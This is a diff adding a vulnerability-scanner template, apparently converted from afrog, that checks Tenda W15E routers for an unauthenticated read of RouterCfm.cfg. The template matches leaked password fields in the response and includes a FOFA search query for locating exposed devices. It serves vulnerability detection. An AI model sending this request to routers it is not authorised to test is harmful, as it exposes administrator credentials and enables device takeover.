@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - sys.userpass=
+          - sys.userpass.decode.pwd=
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/cgi-bin/DownloadCfg/RouterCfm.cfg'
+id: tenda-w15e-routercfm-cfg-config-leak
+info:
+  author: zan8in
+  description: |
+    Tenda 企业级路由器 RouterCfm.cfg 配置文件可在未授权的情况下被读取，导致账号密码等敏感信息泄漏
+    fofa: title=="Tenda | Login" && country="CN"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Tenda W15E企业级路由器 RouterCfm.cfg 配置文件泄漏漏洞
+  severity: high
+  tags: tenda,os,router,cfg,config,leak,argus-import
